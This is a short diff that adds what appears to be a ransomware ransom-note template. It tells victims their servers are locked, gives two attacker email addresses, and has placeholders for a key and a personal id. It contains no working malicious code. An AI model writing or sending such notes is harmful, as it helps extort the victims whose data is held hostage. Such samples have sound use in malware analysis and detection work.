@@ -1,0 +1,11 @@
+Your servers is LOCKED. Do not try to use other software.
+You can contact us directly for further instructions through emails:
+ 
+eviluser@tutanota.com
+evilpr0ton@protonmail.com
+ 
+In subject write your key (below).
+ 
+Recovery information:
+key: {PATTERN_ID}
+personal id: {UID}
